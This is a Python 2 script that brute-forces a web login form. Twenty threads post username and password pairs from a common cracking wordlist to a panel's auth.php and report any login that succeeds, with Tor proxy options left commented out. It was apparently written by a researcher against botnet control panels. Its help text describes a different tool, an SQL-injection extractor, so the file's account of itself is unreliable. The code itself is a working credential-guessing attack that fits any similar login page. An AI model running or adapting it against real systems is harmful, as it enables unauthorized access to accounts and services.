import pycurl
import urllib
import cStringIO
import threading
import time

# Configuration
thread_count = 20
queue_buffer_length = 1000


queue_rlock = threading.RLock()
checked = 0
job_queue = []
done = False


def increment_check_count():
    global queue_rlock, checked
    with queue_rlock:
        checked += 1
        if checked % 100 == 0:
            print "Checked " + str(checked)


def thread_engine():
    global done, job_queue, queue_rlock
    try:
        while True:
            item = None
            with queue_rlock:
                if done:
                    break
                if len(job_queue) > 0:
                    item = job_queue[0]
                    del job_queue[0]
            if item is None:
                time.sleep(1)
                continue
            if check_login(item[0], item[1], item[2]):
                print "COMPLETE: %s - %s - %s" % (item[0], item[1], item[2])
                with queue_rlock:
                    done = True
            increment_check_count()
    except:
        print "exception"
    finally:
        with queue_rlock:
            done = True
            job_queue = []


def check_login(uri, user, password):
    try:
        buf = cStringIO.StringIO()
        c = pycurl.Curl()
        params = urllib.urlencode({'username': user, 'password': password})
        c.setopt(c.URL, uri)
        c.setopt(c.POSTFIELDS, params)
        c.setopt(c.HEADERFUNCTION, buf.write)
        c.setopt(c.WRITEFUNCTION, lambda x: None)
        #c.setopt(pycurl.PROXY, 'localhost')
        #c.setopt(pycurl.PROXYPORT, 9050)
        #c.setopt(pycurl.PROXYTYPE, pycurl.PROXYTYPE_SOCKS5)
        c.perform()

        val = buf.getvalue()
        if val.find("Location: index.php") == -1:
            return False
        return True
    except:
        time.sleep(1)
        return check_login(uri, user, password)


def print_help():
    print("usage: herpesnet.class.py [-h] url-of-run.php")
    print("")
    print("Herpes Net 3.0 Database Extraction")
    print("Gathering information via SQLi from Herpes Net 3.0 botnets")
    print("By Brian Wallace (@botnet_hunter)")
    print("")
    print("  url-of-run.php                URL of run.php in the Herpes Net panel")
    print("  -h --help                     Print this message")
    print("")

if __name__ == "__main__":

    try:
        userfile = 'darkc0de.lst'
        passfile = 'darkc0de.lst'


        for i in range(0, thread_count):
            t = threading.Thread(target=thread_engine)
            t.daemon = False
            t.start()

        uri = "http://panel/mad/adm/auth.php"
        done = False

        with open(userfile) as f:
            for user in f:
                user = user.strip("\r\n\t ")
                with queue_rlock:
                    if done:
                        break
                with open(passfile) as p:
                    while True:
                        with queue_rlock:
                            if len(job_queue) < queue_buffer_length or done:
                                break
                        time.sleep(100)
                    print "Queuing passwords for user " + user
                    for password in p:
                        password = password.strip("\r\n\t ")
                        with queue_rlock:
                            if done:
                                break
                            job_queue.append((uri, user, password))

        while True:
            with queue_rlock:
                if len(job_queue) == 0 or done:
                    break
            time.sleep(1)

    finally:
        with queue_rlock:
            done = True
        print "Shutting down threads"